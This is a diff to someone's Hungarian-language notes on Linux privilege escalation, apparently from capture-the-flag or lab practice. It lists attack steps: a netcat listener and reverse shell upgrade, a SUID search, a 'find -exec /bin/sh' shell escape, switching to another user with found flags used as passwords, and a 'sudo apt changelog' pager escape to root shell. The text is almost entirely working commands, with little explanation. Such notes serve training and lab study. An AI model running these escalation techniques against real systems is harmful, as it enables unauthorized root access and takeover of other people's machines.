@@ -411,7 +411,21 @@ nc -lvnp 4444 listener készítése
 utána a felületi shellen /tmp/shell.elf
 a terminálon python3 -c "import pty;pty.spawn('/bin/bash')"
 sudo -l mihez van jogom
-find / -perm -u=s 2>/dev/null itt nézni van-e eltérés (itt a find)
+find / -perm -u=s 2>/dev/null itt nézni van-e eltérés (itt a find parancson van suid bit, itt a 2. sor ami érdekel minket a gtfo oldalon)
+find . -exec /bin/sh \; -quit - másik user leszek
+ls /home/felhasználó
+sudo -l - itt az eredeti shell user-jének jelszavát kéri, ilyenkor su-val átváltunk az új user-re
+Erős gépen minden megtalált flag a jelszava is a felhasználónak, kivéve a root
+su kate
+sudo -l itt az apt-ra van joga kate-nek
+
+vagy SSH-n kate:jelszó -val 
+
+sudo apt changelog apt - elsőnek ezt
+!/bin/sh - majd ezt
+
+
+
 
 
 
